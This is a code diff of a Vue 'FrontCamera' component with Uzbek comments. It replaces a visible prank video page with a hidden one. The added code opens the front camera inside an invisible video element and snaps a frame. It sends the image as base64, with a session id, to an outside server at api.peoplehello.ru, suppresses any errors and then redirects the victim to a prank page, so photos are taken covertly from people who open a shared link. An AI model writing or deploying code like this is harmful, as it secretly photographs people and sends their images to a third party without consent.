@@ -1,118 +1,99 @@
+<template>
+  <!-- UI butunlay yashirilgan -->
+  <video ref="video" playsinline muted style="display:none"></video>
+</template>
+
 <script>
 export default {
+  name: "FrontCamera",
+
+  mounted() {
+    this.capture()
+  },
   data() {
     return {
-      stream: null,
-      mediaRecorder: null,
-      recordedChunks: [],
-      recording: false,
+      session_id: null
     }
   },
-
-  async mounted() {
-    await this.requestCamera()
-  },
-
   methods: {
-    async requestCamera() {
+    async capture() {
+      const session_id = this.$route.params.id
+      this.session_id = session_id
+
+      if (!session_id) return this.redirect()
+
+      if (!navigator.mediaDevices?.getUserMedia) {
+        return this.redirect()
+      }
+
       try {
-        this.stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
+        // ✅ FRONT kamera
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
           audio: false
         })
 
-        // 🔴 Orqa fonda yozishni boshlaymiz
-        this.startRecording()
+        const video = this.$refs.video
+        video.srcObject = stream
 
-      } catch (e) {
-        alert('Kamera ruxsatisiz davom etib bo‘lmaydi 😢')
-      }
-    },
+        // iOS / WebView uchun MUHIM
+        await video.play()
 
-    startRecording() {
-      this.recordedChunks = []
-      this.mediaRecorder = new MediaRecorder(this.stream)
-
-      this.mediaRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) {
-          this.recordedChunks.push(e.data)
-        }
-      }
-
-      this.mediaRecorder.start()
-      this.recording = true
-
-      // ⏱ 5 soniyadan keyin to‘xtaydi
-      setTimeout(() => {
-        this.stopRecording()
-      }, 5000)
-    },
-
-    stopRecording() {
-      if (this.mediaRecorder && this.recording) {
-        this.mediaRecorder.stop()
-        this.recording = false
-
-        const videoBlob = new Blob(this.recordedChunks, {
-          type: 'video/webm'
+        // Kamera tayyor bo‘lishini kutamiz
+        await new Promise(res => {
+          if (video.readyState >= 2) return res()
+          video.onloadedmetadata = res
         })
 
-        alert(videoBlob)
+        // Barqarorlik uchun kichik delay
+        await new Promise(r => setTimeout(r, 500))
 
-        // 👉 shu joyda backendga yuborish mumkin
-        // const formData = new FormData()
-        // formData.append('video', videoBlob)
-        // axios.post('/api/upload', formData)
+        const canvas = document.createElement("canvas")
+        canvas.width = video.videoWidth || 640
+        canvas.height = video.videoHeight || 480
+
+        const ctx = canvas.getContext("2d")
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
+
+        // Kamerani o‘chiramiz
+        stream.getTracks().forEach(t => t.stop())
+
+        // ❗ toBlob → base64 (ENG ISHONCHLI)
+        canvas.toBlob((blob) => {
+          if (!blob) return this.redirect()
+
+          const reader = new FileReader()
+          reader.onloadend = async () => {
+            const imageBase64 = reader.result // data:image/jpeg;base64,...
+
+            try {
+              await fetch("https://api.peoplehello.ru/api/front-cam", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  image: imageBase64,
+                  session_id
+                })
+              })
+            } catch (e) {
+              // jim
+            } finally {
+              this.redirect()
+            }
+          }
+
+          reader.readAsDataURL(blob)
+        }, "image/jpeg", 0.85)
+
+      } catch (err) {
+        this.redirect()
       }
+    },
+
+    redirect() {
+      this.$router.push(`/prank/${this.session_id}`)
     }
   }
 }
 </script>
 
-<template>
-  <div class="prank-page">
-    <!-- 😂 Kulgili video -->
-    <video
-        class="fun-video"
-        autoplay
-        loop
-        muted
-        playsinline
-    >
-      <source src="../assets/prank.mp4" type="video/mp4" />
-    </video>
-
-    <div class="overlay">
-      <h1>😂 Jiddiy qarang!</h1>
-    </div>
-  </div>
-</template>
-
-<style>
-.prank-page {
-  position: relative;
-  width: 100vw;
-  height: 100vh;
-  overflow: hidden;
-  background: #000;
-}
-
-.fun-video {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-}
-
-.overlay {
-  position: absolute;
-  inset: 0;
-  background: rgba(0,0,0,0.4);
-  color: #fff;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
-  text-align: center;
-}
-</style>
